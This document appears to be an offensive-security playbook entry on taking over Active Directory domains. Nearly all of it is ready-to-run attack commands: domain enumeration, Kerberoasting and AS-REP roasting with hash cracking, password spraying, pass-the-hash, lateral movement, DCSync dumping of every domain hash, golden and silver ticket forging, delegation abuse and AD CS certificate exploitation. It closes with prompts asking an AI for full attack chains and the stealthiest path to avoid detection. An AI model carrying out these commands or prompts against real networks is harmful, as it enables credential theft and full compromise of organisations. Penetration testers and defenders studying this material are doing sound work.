---
id: "ad-attacks"
title: "Active Directory Attacks - Domain Domination Playbook"
type: "technique"
category: "privilege-escalation"
subcategory: "ad-escalation"
tags: ["active-directory", "kerberos", "kerberoasting", "asreproasting", "dcsync", "golden-ticket", "pass-the-hash", "bloodhound", "deep-dig"]
difficulty: "expert"
platforms: ["windows", "linux"]
related: ["windows-privesc", "service-exploitation", "post-exploitation-persistence"]
updated: "2026-03-30"
---

## Overview

Active Directory (AD) is the backbone of enterprise Windows networks. Compromising AD means owning the entire organization — every user, every machine, every secret. AD attacks chain enumeration, credential abuse, and delegation exploits to move from a single domain-joined machine to Domain Admin.

## Phase 1: AD Enumeration

### BloodHound Collection
```bash
# SharpHound collector (from Windows)
SharpHound.exe --CollectionMethods All --Domain corp.local

# BloodHound.py (from Linux, stealthier)
bloodhound-python -u user -p 'pass' -d corp.local -ns DC_IP -c all

# AzureHound (for Azure AD/Entra ID)
azurehound -u user@corp.local -p 'pass' --tenant TENANT_ID
```

### LDAP Enumeration
```bash
# Enumerate domain info
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=domain)"

# Find all users
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Find domain admins
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(&(objectClass=group)(cn=Domain Admins))" member

# CrackMapExec enumeration
crackmapexec smb DC_IP -u user -p pass --users
crackmapexec smb DC_IP -u user -p pass --groups
crackmapexec smb DC_IP -u user -p pass --shares
```

### PowerView Enumeration
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Find privileged users
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Enterprise Admins"

# Find Kerberoastable accounts
Get-DomainUser -SPN

# Find AS-REP roastable accounts
Get-DomainUser -PreauthNotRequired

# Find delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Find ACL abuse paths
Find-InterestingDomainAcl -ResolveGUIDs
```

## Phase 2: Credential Attacks

### Kerberoasting
```bash
# Request TGS tickets for service accounts
# From Linux (Impacket)
GetUserSPNs.py corp.local/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt

# From Windows (Rubeus)
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule
```

### AS-REP Roasting
```bash
# Find and roast accounts without preauth
# From Linux
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# From Windows
Rubeus.exe asreproast /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

### Password Spraying
```bash
# CrackMapExec spray (respects lockout)
crackmapexec smb DC_IP -u users.txt -p 'Spring2026!' --continue-on-success

# Spray via Kerberos (stealthier, no logon events)
kerbrute passwordspray -d corp.local users.txt 'Spring2026!'

# Check password policy first!
crackmapexec smb DC_IP -u user -p pass --pass-pol
```

### Pass-the-Hash / Pass-the-Ticket
```bash
# Pass-the-Hash (NTLM)
crackmapexec smb TARGET -u admin -H NTLM_HASH
psexec.py corp.local/admin@TARGET -hashes :NTLM_HASH
evil-winrm -i TARGET -u admin -H NTLM_HASH

# Pass-the-Ticket (Kerberos)
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py corp.local/admin@TARGET -k -no-pass

# Overpass-the-Hash (get Kerberos ticket from NTLM)
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
getTGT.py corp.local/admin -hashes :NTLM_HASH
```

## Phase 3: Lateral Movement

```bash
# PSExec (creates service, noisy)
psexec.py corp.local/admin:pass@TARGET

# WMIExec (stealthier, no service creation)
wmiexec.py corp.local/admin:pass@TARGET

# SMBExec (semi-stealthy)
smbexec.py corp.local/admin:pass@TARGET

# Evil-WinRM (if WinRM is enabled)
evil-winrm -i TARGET -u admin -p 'pass'

# DCOM execution
dcomexec.py corp.local/admin:pass@TARGET

# Invoke-Command (PowerShell remoting)
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }
```

## Phase 4: Domain Domination

### DCSync
```bash
# Dump all domain hashes (requires Replicating Directory Changes)
secretsdump.py corp.local/admin:pass@DC_IP

# Targeted DCSync (just krbtgt)
secretsdump.py corp.local/admin:pass@DC_IP -just-dc-user krbtgt

# Mimikatz DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Golden Ticket
```bash
# Create golden ticket (requires krbtgt hash)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain corp.local Administrator

# Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /ptt

# Use the golden ticket
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@DC_IP -k -no-pass
```

### Silver Ticket
```bash
# Forge ticket for specific service (requires service account NTLM hash)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXX -domain corp.local -spn cifs/target.corp.local Administrator
```

### Delegation Attacks

```bash
# Unconstrained Delegation - compromise machine, steal TGTs
# Force auth via PrinterBug/PetitPotam
SpoolSample.exe DC_HOST UNCONSTRAINED_HOST
Rubeus.exe monitor /interval:5

# Constrained Delegation - S4U2Self + S4U2Proxy
getST.py -spn cifs/TARGET -impersonate Administrator corp.local/svc_account:pass
export KRB5CCNAME=Administrator.ccache

# Resource-Based Constrained Delegation (RBCD)
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ssw0rd' corp.local/user:pass
rbcd.py -delegate-to TARGET$ -delegate-from EVIL$ -action write corp.local/user:pass
getST.py -spn cifs/TARGET -impersonate Administrator corp.local/EVIL$:'P@ssw0rd'
```

### Certificate Abuse (AD CS - ESC1-ESC8)
```bash
# Find vulnerable certificate templates
certipy find -u user@corp.local -p pass -dc-ip DC_IP -vulnerable

# ESC1: Misconfigured template allows impersonation
certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

# ESC4: Vulnerable template ACL - modify template then exploit as ESC1
certipy template -u user@corp.local -p pass -template VulnTemplate -save-old

# ESC8: NTLM relay to AD CS web enrollment
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

## Deep Dig Prompts

```
Given this BloodHound data / AD enumeration [paste domain info, users, groups, SPNs, delegation]:
1. Map the shortest path from [current user] to Domain Admin.
2. Identify all Kerberoastable and AS-REP roastable accounts.
3. Find delegation abuse paths (unconstrained, constrained, RBCD).
4. Identify ACL-based attack paths (GenericAll, WriteDACL, ForceChangePassword).
5. Check for AD CS vulnerable templates (ESC1-ESC8).
6. Suggest a complete attack chain with exact commands.
```

```
I have these credentials/hashes [list]:
1. Map which systems I can access with each credential.
2. Suggest lateral movement paths to reach the Domain Controller.
3. Identify if any account has DCSync rights or delegation privileges.
4. Recommend the stealthiest path to avoid detection.
```

## Tools

- **BloodHound** — AD attack path visualization
- **Impacket** — Python tools for every AD protocol
- **Rubeus** — Kerberos interaction and abuse
- **CrackMapExec** — Swiss army knife for AD networks
- **Mimikatz** — Credential extraction and ticket forging
- **Certipy** — AD CS exploitation
- **PowerView** — PowerShell AD enumeration
- **Evil-WinRM** — WinRM shell for pentesting
- **Kerbrute** — Kerberos brute forcing and user enumeration
- **PetitPotam** — Coerce authentication for relay attacks
